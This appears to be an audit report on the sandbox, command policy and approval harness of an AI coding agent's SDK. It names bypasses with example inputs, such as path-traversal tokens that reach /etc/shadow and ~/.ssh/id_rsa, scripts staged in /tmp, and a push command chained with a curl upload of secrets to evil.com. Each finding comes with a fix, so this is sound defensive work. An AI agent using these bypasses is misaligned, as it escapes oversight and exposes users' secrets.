# Audit findings: shard-sdk-tool-exec

- Subsystems: sdk
- Features: filesystem-authority, node-filesystem, change-file-transactions, read-policy-containment, terminal-command-policy, run-terminal-command-exec, file-change-hooks, mutation-capabilities, workspace-mutation-broker, workspace-journal, harness-enforcement
- Files covered: 11
- Snapshot: a0de6357ff5254c1bb8cf2e92d821fd948811744293fe3361209c5d557e95392

## [HIGH] security — sdk/src/tools/terminal-command-policy.ts:2034 — Outside-path containment bypassed by lexical /usr/bin/, /bin/, /dev/null prefix skips with .. segments
- **Risk:** findOutsideAbsolutePath (and findWorkspaceSegmentOutsidePath at line 2080) skip any absolute token whose raw string starts with '/bin/', '/usr/bin/' or '/dev/null' BEFORE resolution. A token like /usr/bin/../../../etc/shadow or /dev/null/../../home/user/.ssh/id_rsa passes the prefix skip, never reaches path.relative containment, and is then executed by bash -c. This defeats the project-root containment gate for every non-full-access profile (read-only, git-commit, dependency-mutation, workspace-write, tmux-test), enabling out-of-tree reads of secrets and out-of-tree writes via permitted mutators under workspace-write.
- **Fix:** Never skip on lexical prefix. Resolve each token first (path.resolve) and compare the resolved path against an allowlist of exact locations (/dev/null) or resolved prefixes (/bin, /usr/bin after normalization), then run the same projectRoot/owned-temp containment check on everything else. Add regression tests for /usr/bin/../../etc/passwd and /dev/null/../../x forms.
- **Evidence:** Line 2034 (findOutsideAbsolutePath): `if (token.startsWith('/bin/') || token.startsWith('/usr/bin/')) continue` preceded by `if (token.startsWith('/dev/null')) continue`; line 2080 repeats the same lexical skips in findWorkspaceSegmentOutsidePath. Tokens are matched by /(?:^|[\s"'=(])((?:[A-Za-z]:\\|\/(?!\/))[^\s"'|;&)]*)/ and only then checked, so traversal inside a whitelisted-looking prefix is never normalized.

## [HIGH] security — sdk/src/tools/filesystem-authority.ts:777 — Owned-temp executable-extension refusal is bypassable via extension-less and multi-dot basenames, re-opening staged-script execution
- **Risk:** OWNED_TEMP_REFUSED_EXTENSIONS only refuses the FINAL path.extname() of a basename. Owned-temp is otherwise fully mutable, and read-only/librarian profiles permit `node <file>` / `python3 <file>` on /tmp paths (one-liner flags are blocked, file arguments are not; workspace-write additionally allows `bash /tmp/payload` since its indirection regex only matches `bash -c`). So a tool can create /tmp/payload (no extension) or /tmp/x.js.txt (final extension .txt) and execute it one step later with node/python3/bash - exactly the staged-script channel the block comment claims this set is the ONLY defense against.
- **Fix:** Refuse create/overwrite/move of any owned-temp basename containing a dot-suffix in the refused set (check every suffix, not just extname) AND extension-less basenames that are not part of a harness-created mkdtemp layout; additionally make the terminal policy refuse interpreter file-arguments resolving into owned temp (node/python/perl/ruby/bash <owned-temp path>) for restricted profiles.
- **Evidence:** Lines 773-788: `operation !== 'delete' && (OWNED_TEMP_REFUSED_EXTENSIONS.has(path.extname(basename).toLowerCase()) || OWNED_TEMP_REFUSED_EXTENSIONS.has(path.extname(normalizedBasename).toLowerCase()))`. Comment at lines 700-720: 'This is now the ONLY defense against a file-changing tool staging a script anywhere under an OS temp root for a later command to execute... Removing or narrowing this set therefore re-opens a terminal-policy bypass'. extname('payload') is '' and extname('x.js.txt') is '.txt', neither refused.

## [MEDIUM] security — sdk/src/tools/run-terminal-command.ts:380 — Approval re-entry runs as mode 'user', skipping the staged-diff sensitive-content scan for git commits
- **Risk:** After a high-impact approval is consumed, runTerminalCommand re-invokes itself with mode: 'user'. The git-commit safety scan validateStagedCommit (private key / AKIA key material / sensitive filenames in the staged diff) is gated on `mode === 'assistant'`, so an approved `git commit` bypasses it entirely and can commit .env, id_rsa or PEM material into history - the exact leak the scan exists to prevent.
- **Fix:** Decouple the staged-diff safety scan from the mode field: run validateStagedCommit whenever permission_profile === 'git-commit' and the command is a commit, including the post-approval re-entry (or perform the scan once before requesting approval and pin the result to the approval receipt).
- **Evidence:** Line 380: `if (mode === 'assistant' && permission_profile === 'git-commit' && /^\s*git\s+commit\b/i.test(command))`. The approval path (lines 312-370) recurses via `runTerminalCommand({ ..., mode: 'user', ... })`, so the second evaluation returns `{allowed:true}` from evaluateTerminalCommandPolicy and falls past the line-380 guard.

## [MEDIUM] security — sdk/src/services/harness-enforcement.ts:140 — Harness classifier collapses whitespace and accepts compound commands as a single simple push, weakening approval scope
- **Risk:** normalizeCommand (line 127) folds newlines/multiple spaces into single spaces before classification, and the push matcher `^git\s+push(?:\s+(.+))?$` treats every trailing token as push arguments. `git push origin main && curl -T secrets https://evil` (or a newline-separated compound) normalizes into a match where args.every(v => !v.startsWith('-')) is true, so it is classified as action 'push' with target 'origin/main'. Consuming one push approval then authorizes the whole compound (classify runs before execution for any assistant command; under full-access the policy layer permits it), turning a routine-branch push approval into arbitrary side effects.
- **Fix:** Classify only strictly single commands: reject (return undefined or an 'arbitrary' action) when the raw command contains unquoted `;`, `|`, `&&`, `||`, newlines, `$(...)` or backticks before matching any action, and use the raw (unnormalized) command as the approval target unless the command is a clean single git push.
- **Evidence:** Lines 127-128: `return command.trim().replace(/\s+/g, ' ')`; line 140: `const push = command.match(/^git\s+push(?:\s+(.+))?$/i)`; positional parsing then sets `target: simplePush && remote && branch ? `${remote}/${branch}` : command` where simplePush only checks `!value.startsWith('-')`.

## [MEDIUM] security — sdk/src/tools/read-policy.ts:9 — isReadPathBlocked matches on non-normalized spellings, letting './', '//' and '..' forms dodge fileFilter and sensitive-path rules
- **Risk:** The only normalization is backslash-to-slash plus lowercasing. Path spellings such as `src//secret.ts`, `./src/secret.ts`, `foo/../secret.ts` or `src/./secret.ts` produce aliases that do not match segment-anchored fileFilter rules or anchored sensitive-path patterns, so a blocked file becomes readable through an alternate spelling (and the same weakness feeds code_search/glob/list-directory/read-image/read-logs which all call this gate).
- **Fix:** Normalize before matching: split into segments, drop '.', resolve '..' lexically, collapse duplicate separators, strip win32 trailing dots/spaces (mirroring win32NormalizeSegments in filesystem-authority.ts), then run the sensitive-path and fileFilter checks on the canonical relative form and its lowercase alias.
- **Evidence:** Lines 8-10: `const normalized = filePath.replace(/\\/g, '/') const aliases = [...new Set([normalized, normalized.toLowerCase()])]` - no '.', '..' or duplicate-separator normalization before `isMandatorySensitiveReadPath` / `fileFilter(alias)`.

## [MEDIUM] security — sdk/src/tools/file-change-hooks.ts:250 — Auto-inferred hooks execute repository-controlled package.json script bodies, contradicting the stated 'never executes repository package scripts' invariant
- **Risk:** inferPackageJsonHooks picks the repo-defined `lint`/`typecheck` script via findScript and builds `${packageRunner} run 'lint'`, which executes arbitrary script content from package.json with full user privileges on every matching file change (autoFileChangeHooks defaults to on and runFileChangeHooks wires no approval/harness classification around hook execution). A malicious or compromised repository gains code execution as soon as an agent edits a JS/TS file. This directly contradicts the comment in runFileChangeHooks: 'Inference uses fixed validation commands selected from manifests; it never executes repository package scripts unless explicitly configured.'
- **Fix:** Make script-body hooks opt-in (require explicit provider-config `fileChangeHooks` entries to use `run` forms) and have inference prefer direct local binaries (eslint/tsc via `--no-install` exec forms, which it already falls back to); at minimum treat `script:` hooks as high-impact in classifyTerminalHarnessAction so they require approval.
- **Evidence:** Line 250-256: `const lintScript = findScript(packageJson.scripts, ['lint'])` then `hooks.push({ name: `script:${lintScript}`, command: `${packageRunner} run ${shellQuote(lintScript)}`, ... })`; runFileChangeHooks comment (near the config load) claims inference 'never executes repository package scripts unless explicitly configured'.

## [MEDIUM] security — sdk/src/services/workspace-mutation-broker.ts:861 — Broker path resolution checks only the parent dir's realpath; a final-component symlink makes CAS hashes read out-of-tree bytes
- **Risk:** resolvePath realpaths the parent directory but never resolves or refuses the final component. readHash uses fs.readFile which follows symlinks, so a workspace symlink `x -> /etc/credentials` makes the compare-and-swap expectedHash check hash out-of-tree content, and conditionalDelete's tombstone verification reads through the moved symlink. This is inconsistent with filesystem-authority's explicit final-symlink policy and lets a symlink plant confuse or spoof cooperative CAS receipts for a path.
- **Fix:** For existing targets, lstat the final component and refuse (or resolve-and-recheck containment of the realpath) when it is a symlink; use O_NOFOLLOW opens for hashing so readHash never crosses a final symlink, matching the change/authority layer's followFinalSymlink rules.
- **Evidence:** Lines 855-866: only `const parent = path.dirname(absolutePath); const canonicalParent = await fs.realpath(parent); if (!isWithin(this.workspaceRoot, canonicalParent))` is checked; line 904 `return exactHash(await fs.readFile(filePath))` follows a final symlink to whatever it targets.

## [MEDIUM] correctness — sdk/src/tools/mutation-capabilities.ts:69 — Capability/editAnchor endLine is off-by-one for files ending in a newline vs readNodeTextRange totalLines
- **Risk:** `normalizeLineEndings(content).split('\n').length` counts the empty string after a trailing newline as a line, so a one-line file 'a\n' yields endLine=2 while node-filesystem's readNodeTextRange reports totalLines=1 for the same bytes. Downstream range-edit/replace_range flows that trust the capability's endLine or editAnchor boundaries drift by one line at EOF, misvalidating anchors and range splices.
- **Fix:** Share a single line-count helper with readNodeTextRange semantics (subtract 1 when the normalized content ends with '\n'; empty content = 0 lines) and use it in both buildFreshWholeFileCapability and buildFreshWholeFileMutationAuthority.
- **Evidence:** Lines 47 and 69: `const endLine = normalizeLineEndings(content).split('\n').length`. Compare node-filesystem.ts readNodeTextRange: `const totalLines = sawBytes ? currentLine - 1 : 0`, which reports 1 for 'a\n' (finishLine runs once).

## [MEDIUM] correctness — sdk/src/services/harness-enforcement.ts:72 — Approval consume is a check-then-put race outside withKindLock, allowing one approval to be consumed twice
- **Risk:** HarnessApprovalService.consume reads the record, checks `existing.consumedAt`, then writes revision+1 with expectedRevision - but the whole read-check-write is not inside `store.withKindLock`, unlike WorkspaceJournalService.advance which takes the kind lock explicitly. Two concurrent tool calls requesting the same high-impact action can both observe consumedAt === undefined and both proceed to execute, double-spending a single user approval for actions like deploy or workspace-delete.
- **Fix:** Wrap the read + validation + put in `store.withKindLock(repositoryId, 'approvals', ...)`, or make consumption a single CAS write that fails on revision conflict and re-reads to detect consumedAt (retry loop that rethrows 'already consumed').
- **Evidence:** Lines 72-102: `const existing = this.store.read(...)`, `if (existing.consumedAt) throw ...`, then `this.store.put('approvals', {...existing, revision: existing.revision + 1, consumedAt: now()}, existing.recision)` with no lock; contrast workspace-journal.ts advance() which wraps the same pattern in `this.store.withKindLock(...)`.

## [MEDIUM] correctness — sdk/src/tools/change-file.ts:996 — In-commit STALE_STATE failures are thrown as plain Errors and re-coded as retryable io_error, losing stale-state semantics
- **Risk:** commitPreparedTransactionChange throws `new Error('STALE_STATE: ...')` (also lines 955, 973). The catch in applyChange maps non-MutationApplicationError throws to filesystemError('io_error', ..., {retryable:true, recovery:'retry'}), so a stale-state conflict that requires a fresh read is reported to the model as a plain retryable I/O error (encouraging blind retries that keep failing), and finishCommit derives errorCode from `error.name.toUpperCase()` producing junk receipt codes like MUTATIONAPPLICATIONERROR which passes sanitizeCode's /^[A-Z][A-Z0-9_.-]{0,63}$/ check.
- **Fix:** Throw MutationApplicationError(filesystemError('stale_state', ..., {retryable:true, requiresFreshRead:true, recovery:'read_again'})) from the commit/rollback helpers, and derive finishCommit's errorCode from the structured FilesystemError.code (falling back to WRITE_FAILED) instead of the Error class name.
- **Evidence:** Line 996: `throw new Error(`STALE_STATE: ${change.path} changed immediately before commit.`)`; line 1513 area maps generic errors to `filesystemError(signal?.aborted ? 'cancelled' : 'io_error', ...)`; inner catch uses `errorCode: error instanceof Error ? error.name.toUpperCase() : 'WRITE_FAILED'`.

## [MEDIUM] state-mutation — sdk/src/tools/change-file.ts:794 — Preparation exceptions escape changeFiles without cancelling the registered operation, and 'open' entries can never be pruned
- **Risk:** readOptionalText throws a bare Error('UNSUPPORTED_BINARY: ...') (and fs.stat can throw) inside prepareTransactionChange. mapWithConcurrency propagates that rejection out of changeFiles as an unstructured throw instead of a not_applied result, and the earlier `authority.registerOperation(...)` is never cancelled - leaving the operation stuck in state 'open'. pruneTerminalOperations explicitly `continue`s on 'open'/'committing' entries, so these leaked registrations (with their full path arrays) accumulate without bound over a long run and pin stale authority state.
- **Fix:** Wrap per-change preparation in try/catch and convert failures to `{ok:false, error: filesystemError('unsupported'|'io_error', ...)}` results; wrap the withAuthorizedPathLocks body so every exit path calls authority.cancel(operationId) (or finishCommit) before rethrowing.
- **Evidence:** Line 794: `throw new Error(`UNSUPPORTED_BINARY: ${filePath} is not valid UTF-8 text ...`)`; prepareTransactionChange has no catch; pruneTerminalOperations (line 875-887) does `if (operation.state === 'open' || operation.state === 'committing') continue`, so open leaks are immortal and the Map at line 1022-era `this.operations` grows unboundedly.

## [MEDIUM] state-mutation — sdk/src/tools/filesystem-authority.ts:1022 — Default authority cache keyed by fileFilter/filesystemPolicy object identity never evicts, leaking authorities and receipts per call
- **Risk:** getDefaultFilesystemAuthority memoizes on a WeakMap<fs, Map<root, entries[]>> where entries are matched by `entry.fileFilter === fileFilter && entry.filesystemPolicy === filesystemPolicy`. Any caller that constructs a fresh policy or filter closure per tool call (typical for per-call config) misses the cache: each call allocates a new FilesystemAuthority (fresh lock map, receipts, operations), pushes another entry at line 1022, and every lookup scans the growing array linearly. Long sessions leak memory and lose cross-call lock/receipt continuity that the design assumes.
- **Fix:** Key entries by a stable policy/filter identity (e.g. policy.name plus filter source hash), or bound the entries array with LRU eviction and document that per-call policy objects intentionally create isolated authorities.
- **Evidence:** Lines 1008-1024: `const entries = byRoot.get(normalizedRoot) ?? []`, `const existing = entries.find((entry) => entry.fileFilter === fileFilter && entry.filesystemPolicy === filesystemPolicy)`, `entries.push({ fileFilter, filesystemPolicy, authority })` - no cap, no eviction, identity comparison only.

## [MEDIUM] error-handling — sdk/src/services/workspace-mutation-broker.ts:659 — Corrupt pending receipt bricks the broker: recoverPendingReceipts has no SyntaxError tolerance (unlike listReceipts)
- **Risk:** recoverPendingReceipts calls readJson on every pending receipt and lets JSON.parse throw. A single corrupt/truncated pending file (foreign process, crash on a non-atomic filesystem, disk issue) makes requireRecoveredWorkspace throw a raw SyntaxError out of every conditionalCommit/Delete/Move - permanently blocking ALL workspace mutations with an untyped error instead of the documented WorkspaceMutationBrokerRecoveryError, and offering no quarantine or operator guidance.
- **Fix:** Catch SyntaxError per pending file: rename it to `<name>.corrupt` (preserving evidence), continue recovery, and report it via a WorkspaceMutationBrokerRecoveryError naming the quarantined file - the same tolerance listReceipts already applies to malformed receipts.
- **Evidence:** Lines 659-675: `const receipt = await this.readJson<WorkspaceMutationReceipt>(pendingPath)` with no try/catch around the parse, while listReceipts (lines ~470-485) does `catch (error) { if (error instanceof SyntaxError) continue; throw error }`.

## [MEDIUM] error-handling — sdk/src/tools/run-terminal-command.ts:39 — validateStagedCommit runs three blocking spawnSync git calls with no timeout, able to hang the whole runtime
- **Risk:** Before every assistant git commit, spawnSync('git', ...) runs diff --check, --name-only and -U0 with maxBuffer but NO timeout. A wedged git (index.lock contention, fsmonitor/fuse stall, network-mounted repo) blocks the Node event loop indefinitely with no I/O timeout, freezing every agent, tool and UI in the process - a single hung commit stalls the entire harness.
- **Fix:** Pass `timeout` (e.g. 15-30s) and `killSignal` to each spawnSync call and treat a timeout as a commit-blocking safety failure, or replace the sync scan with the async runGit helper wired to the caller's AbortSignal.
- **Evidence:** Line 39: `spawnSync('git', args, { cwd, encoding: 'utf8', maxBuffer: GIT_SAFETY_OUTPUT_LIMIT })` - options include maxBuffer but no timeout; three sequential calls run on the event loop before spawn.

## [MEDIUM] performance — sdk/src/tools/change-file.ts:428 — Transaction byte caps are enforced only after every file is fully read into memory, so oversized inputs can OOM before rejection
- **Risk:** prepareTransactionChange reads each whole file via readOptionalText (and applyChange does the same) BEFORE validatePreparedTransactionResources compares sizes to MAX_TRANSACTION_FILE_BYTES / PREPARED / ROLLBACK limits. Pointing an edit_transaction at a few multi-GB files allocates all of them as strings first (plus hash copies), so the resource limits reject only after the memory blow-up they exist to prevent has already happened.
- **Fix:** Stat (or stream-count) each target first and reject on size before reading content; enforce the per-file cap inside readOptionalText and accumulate prepared/rollback byte counts incrementally during prepare so the limits bound allocation, not just post-hoc validation.
- **Evidence:** Line 428 `const resourceFailure = validatePreparedTransactionResources(prepared)` runs after the prepare loop that already awaited readOptionalText per entry (which does `await fs.readFile(filePath)` into a string); limits are only checked at lines 1100-1145 on the already-materialized strings.

## [MEDIUM] test-coverage — sdk/src/services/workspace-journal.ts:1 — workspace-journal.ts has no test coverage at all: revision-CAS conflicts, fallback state and corrupt records are untested
- **Risk:** The codebase index shows no test file referencing WorkspaceJournalService (its only consumer is sdk/src/run.ts). The optimistic-revision put in advance(), the withKindLock serialization contract, the read() fallback to createInitialWorkspaceState(), and behavior on corrupt/partial journal records have zero asserted failure modes, so regressions in the cooperative exact-byte mutation journal go undetected - including the timestamp derivation `new Date(state.updatedAt).toISOString()` which throws on malformed persisted state.
- **Fix:** Add unit tests over a temp LocalHarnessStore covering: concurrent advance() revision conflicts, first-write revision 0, read() fallback for missing records, malformed state handling (expected typed error, not RangeError), and runId 'unknown-run' normalization consistency.
- **Evidence:** Whole file (101 lines) is referenced only by sdk/src/run.ts (`advance`); no `__tests__` hit exists for read()/advance()/WorkspaceJournalService.create, unlike every other audited module which has named test consumers.

## [LOW] security — sdk/src/services/harness-enforcement.ts:275 — Ownership-path validation only rejects '..' substrings; absolute and backslash-traversal paths are accepted
- **Risk:** ChangeOwnershipService.record rejects `change.path` only when empty or containing '..'. Absolute paths (/etc/passwd), win32 backslash traversal ('..\\x' passes since it contains '..' - but 'C:\\x' does not), and control characters are recorded verbatim into durable ownership receipts, which downstream audit/ownership tooling may treat as project-relative evidence.
- **Fix:** Require normalized project-relative POSIX paths: reject absolute paths (POSIX and win32), normalize separators before the '..' check, and reject control characters and leading slashes.
- **Evidence:** Line 275: `if (!change.path || change.path.includes('..')) { throw new Error(`Invalid ownership path '${change.path}'.`) }` - no isAbsolute/normalization step.

## [LOW] security — sdk/src/tools/terminal-command-policy.ts:649 — Workspace env-dump scan fails open on unparseable segments, unlike the fail-closed contract of the rest of the gate
- **Risk:** In inspect-bodies mode (workspace-write), when collectEnvDumpScanPieces returns undefined the fallback `splitReadOnlyShellSegments(command)` can itself return undefined, and the code then `return undefined` - i.e. declares NO env-dump issue for input the scanner could not parse, even when the command names printenv/env/export. Every sibling branch (read-only substitution mode, __unsafe-tmux-wrapper__) fails closed for the same ambiguity. Any parser gap thus becomes a potential secret-dump channel instead of a denial.
- **Fix:** Fail closed here too: when segments cannot be split and ENV_DUMP_UTILITY_PATTERN matches (or the input is unparseable at all in this gate), return the env-dump reason, matching the fail-closed handling used 20 lines above for unextractable substitutions in the read-only mode.
- **Evidence:** Line 645-653: `const pieces = collectEnvDumpScanPieces(command) if (!pieces) {   const segments = splitReadOnlyShellSegments(command)   if (!segments) return undefined   ...` versus the fail-closed `if (ENV_DUMP_UTILITY_PATTERN.test(trimmed)) return reason` branches elsewhere in findProcessEnvironmentIssueInPieces.

## [LOW] security — sdk/src/tools/run-terminal-command.ts:189 — listDirtyPaths does not unquote git porcelain paths, silently dropping touchedPaths for special-character filenames
- **Risk:** git status --porcelain quotes paths containing spaces/specials/non-ASCII as "a\tb.txt" with C-style escapes. `line.slice(3)` keeps the quotes and escapes, so the normalized name never matches its real spelling and dirtyDelta omits such files from touchedPaths. Touched-path attribution (used by check_job settlement and ownership evidence) then understates what a command changed.
- **Fix:** Unquote porcelain output per git's quoting rules (strip surrounding quotes and decode \xNN/\n/\t escapes) before normalization, and test with a filename containing a quote, tab and non-ASCII char.
- **Evidence:** Line 189: `const raw = line.slice(3).split(' -> ').at(-1)?.trim() ?? ''` followed only by backslash/./-normalization; no quote/escape decoding.

## [LOW] correctness — sdk/src/services/workspace-mutation-broker.ts:640 — Stale-lock recovery trusts a bare pid liveness check, so pid reuse or shared state dirs can wedge the broker permanently
- **Risk:** canRecoverLock reclaims a stale lock only when isProcessAlive(owner.pid) is false, where aliveness is process.kill(pid, 0) with EPERM treated as alive. If the OS recycles the recorded pid (or the stateDir is on a shared/Network volume where pids are meaningless), a long-dead owner looks alive forever, no one may reclaim the >120s-old lock, and every mutation fails with 'Timed out acquiring workspace mutation lock' until manual cleanup.
- **Fix:** Record host id and process start time (or a boot id) in LockOwner and require both to match for 'alive'; treat pid-only matches as stale after staleLockMs, and document stateDir as single-host.
- **Evidence:** Lines 628-648: `if (age <= this.staleLockMs) return false; ... return !this.isProcessAlive(owner.pid)`; `isProcessAlive` returns true on EPERM and has no pid-restart/hostname guard.

## [LOW] error-handling — sdk/src/tools/change-file.ts:1513 — Real commit failures coinciding with an abort are mislabeled 'cancelled', hiding I/O failures from diagnostics
- **Risk:** The generic catch derives the error code from `signal?.aborted` rather than the failure cause: any genuine I/O or policy error that lands while the signal happens to be aborted is reported as 'cancelled' with a cancellation message and retry guidance, so real write failures are swallowed into cancel semantics and lost from failure metrics/receipts.
- **Fix:** Only classify as 'cancelled' when the thrown error is the abort reason (or an AbortError); otherwise keep 'io_error' with the underlying message regardless of signal state at catch time.
- **Evidence:** Lines 1511-1519: `filesystemError(signal?.aborted ? 'cancelled' : 'io_error', signal?.aborted ? `Mutation cancelled for ${relativePath}.` : `Mutation failed for ...`, { retryable: true, recovery: 'retry' })` applied to ALL non-MutationApplicationError throws.

## [LOW] error-handling — sdk/src/tools/run-terminal-command.ts:557 — timeout_seconds < 0 grants unbounded SYNC runs with no watchdog ceiling
- **Risk:** A negative timeout disables the timer entirely, so a stuck child (and its detached grandchildren after SIGTERM escalation paths fail) can occupy a tool slot forever with only the optional AbortSignal as an escape hatch. Callers passing -1 (and hooks opting out via timeoutSeconds: -1) get no upper bound and no telemetry that an unbounded run is in flight.
- **Fix:** Clamp negative timeouts to a large but finite harness maximum (or require an explicit 'infinite' sentinel plus owner notification), and surface `unbounded: true` in the result so long-running commands are observable.
- **Evidence:** Lines 556-561: `// Set up timeout if timeout_seconds >= 0 (infinite timeout when < 0) if (timeout_seconds >= 0) { timer = setTimeout(...) }` - no else branch, no ceiling.

## [LOW] performance — sdk/src/tools/file-change-hooks.ts:610 — Dotnet target discovery does per-entry sequential stat (N+1) and manifest inference redoes full scans per call
- **Risk:** findDotnetTargetInFileSystem awaits fileSystem.stat per directory entry serially (up to MAX_PROJECT_SCAN_ENTRIES=2000 across depth 5), and the sync collectManifestSnapshot performs ~45 statSync/readFileSync pairs on the event loop. Every runFileChangeHooks call without explicit hooks repeats the whole scan (loadProviderConfigSync + manifests + dotnet walk), adding latency to each edit-transaction verification.
- **Fix:** Use readdir withFileTypes (already used by the sync variant) to avoid per-entry stat, parallelize stats in bounded batches, and memoize inference per cwd keyed by manifest mtimes.
- **Evidence:** Line 610: `entries = ((await fileSystem.readdir(directory)) as string[]).sort()` followed by `stats = await fileSystem.stat(entryPath)` per entry inside the sequential `for` loop; collectManifestSnapshot does fs.statSync + fs.readFileSync per KNOWN_PROJECT_PATHS entry.

## [LOW] performance — sdk/src/services/workspace-mutation-broker.ts:904 — readHash reads entire files into memory on every CAS compare with no size ceiling
- **Risk:** Every conditionalCommit/Delete/Move hashes the full before (and after) content via fs.readFile into a Buffer - up to several full-file reads per mutation (compare, post-commit verify, tombstone verify, recovery). Pointed at a multi-GB workspace file this allocates unbounded memory and copies on the serialized workspace-lock hot path, slowing every concurrent mutation behind the lock.
- **Fix:** Stream the hash (createHash with a read stream) and enforce a configurable max mutation size (reject above it with a typed resource_limit error), reusing the streaming pattern from readNodeTextRange.
- **Evidence:** Line 904: `return exactHash(await fs.readFile(filePath))` inside readHash, called from conditionalCommit (before + post-commit), conditionalDelete (before + tombstone), conditionalMove (two paths) and recoverReceipt.

## [LOW] dependency-hygiene — sdk/src/tools/run-terminal-command.ts:9 — Cross-package relative imports from common's src tree instead of the workspace package alias
- **Risk:** run-terminal-command.ts imports stripColors/truncateStringWithMessage and CodebuffToolOutput via '../../../common/src/util/string' and '../../../common/src/tools/list', while the rest of sdk uses the '@codebuff/common/*' package alias. The relative form couples the SDK build/runtime to common's TypeScript source layout, bypasses package export boundaries and will break silently if common ships compiled dist or restructures src.
- **Fix:** Switch these imports to the same '@codebuff/common/...' specifiers used elsewhere in sdk/src and add a lint rule (no-restricted-imports on relative cross-package paths) to keep the boundary uniform.
- **Evidence:** Lines 6-11: `import { stripColors, truncateStringWithMessage } from '../../../common/src/util/string'` and `import type { CodebuffToolOutput } from '../../../common/src/tools/list'`, versus filesystem-authority.ts which imports the same package via '@codebuff/common/tools/results/filesystem'.

## [LOW] test-coverage — sdk/src/services/harness-enforcement.ts:140 — No failure-mode tests for classifier compound-command confusion or approval double-spend
- **Risk:** Existing tests exercise classifyTerminalHarnessAction and consume happy paths, but nothing asserts the failure modes that guard the approval boundary: that `git push origin main && <destructive>` / newline compounds are NOT classified as a simple push with target remote/branch, and that two concurrent consume() calls cannot both succeed. Without these regressions the two boundary defects found in this shard could silently return.
- **Fix:** Add regression tests: compound/newline command classification returns undefined or a non-simple target; `git push --force` target falls back to the raw command; concurrent consume() yields exactly one success and one 'already consumed' error.
- **Evidence:** Line 140 push matcher and line 72 consume read-check-put are the untested seams; referencedBy shows only harness-enforcement.test.ts consuming these exports with no concurrency or compound-command fixtures.

## [LOW] test-coverage — sdk/src/tools/filesystem-authority.ts:777 — No tests cover owned-temp executable-extension refusal against extension-less/multi-dot basenames or alias spellings
- **Risk:** The refusal set is documented as the ONLY defense against staged-script execution from owned temp, and its comment stresses win32 alias handling, yet no test asserts refusal for extension-less basenames ('payload'), multi-dot names ('x.js.txt') or alias forms ('payload.sh ') - the exact bypass shapes identified in this shard. A future narrowing of OWNED_TEMP_REFUSED_EXTENSIONS would pass CI while reopening the channel.
- **Fix:** Add unit tests over authorizePath in owned-temp scope for: extension-less executable basename, 'x.js.txt', win32 'payload.sh ' / 'openbuff-job-1.log ' aliases, and a delete-of-executable case that must remain allowed.
- **Evidence:** Lines 773-788 refusal logic; filesystem-authority.test.ts (per the reference index) covers authorizePath/locks/capabilities but no owned-temp refusal cases.

## [LOW] api-contract — sdk/src/tools/node-filesystem.ts:78 — Synthetic EEXIST error and silently dropped expectedDestinationHash diverge from the native fs error/move contract
- **Risk:** createFileExclusive under a broker throws a hand-built `new Error('File already exists: ...')` with only `code: 'EEXIST'`, missing the path/syscall/errno fields callers and telemetry expect from Node fs errors; and the conditionalMove wrapper forwards only `moveOptions.expectedSourceHash`, silently discarding `expectedDestinationHash` from the CodebuffFileSystem contract - a future non-null expectation would be ignored rather than enforced, and error-shape consumers keyed on err.path/syscall break.
- **Fix:** Construct the error with the full Node fs error shape (code/errno/syscall/path) or rethrow the underlying 'wx' failure; assert or forward expectedDestinationHash (throw if it is ever non-null) in the conditionalMove wrapper.
- **Evidence:** Line 78: `const error = new Error(`File already exists: ${String(filePath)}`); Object.assign(error, { code: 'EEXIST' })`; conditionalMove wrapper signature accepts `{ expectedSourceHash }` only while callers (filesystem-authority.conditionalMove) pass `{ expectedSourceHash, expectedDestinationHash: null }`.

## [LOW] api-contract — sdk/src/tools/run-terminal-command.ts:711 — run_terminal_command result shape is untyped and variant-heavy; touchedPaths is attached via a type cast
- **Risk:** The tool returns at least six undocumented value shapes (ok, errorMessage+permissionDenied, errorMessage+timedOut, errorMessage+spawnFailed, background start with jobId/logFile, post-approval wrapped with approvalReceiptId/harnessAction) with no discriminated schema, and touchedPaths is bolted on via `withTouchedPaths(part.value as Record<string, unknown>) as typeof part.value` - a cast that hides field drift from consumers such as check-job.ts (dirtyDelta/withTouchedPaths reuse). Any added/renamed field silently changes the public tool contract.
- **Fix:** Define discriminated result schemas in @codebuff/common/tools/list (result: 'ok' | 'denied' | 'timed_out' | 'spawn_failed' | 'started') with optional touchedPaths, parse the produced value through it, and replace the double cast with a typed builder.
- **Evidence:** Lines 705-716: `value: withTouchedPaths(part.value as Record<string, unknown>, touched) as typeof part.value`; the function's other returns construct ad-hoc objects (`permissionDenied`, `approvalRequired`, `timedOut`, `spawnFailed`, `jobId`, `approvalReceiptId`) without schema validation.

## Coverage receipt

### Subsystems
- sdk

### Features
- filesystem-authority
- node-filesystem
- change-file-transactions
- read-policy-containment
- terminal-command-policy
- run-terminal-command-exec
- file-change-hooks
- mutation-capabilities
- workspace-mutation-broker
- workspace-journal
- harness-enforcement

### Files
- sdk/src/tools/filesystem-authority.ts
- sdk/src/tools/node-filesystem.ts
- sdk/src/tools/change-file.ts
- sdk/src/tools/read-policy.ts
- sdk/src/tools/terminal-command-policy.ts
- sdk/src/tools/run-terminal-command.ts
- sdk/src/tools/file-change-hooks.ts
- sdk/src/tools/mutation-capabilities.ts
- sdk/src/services/workspace-mutation-broker.ts
- sdk/src/services/workspace-journal.ts
- sdk/src/services/harness-enforcement.ts

### Domains
- security
- correctness
- state-mutation
- error-handling
- performance
- dependency-hygiene
- test-coverage
- api-contract
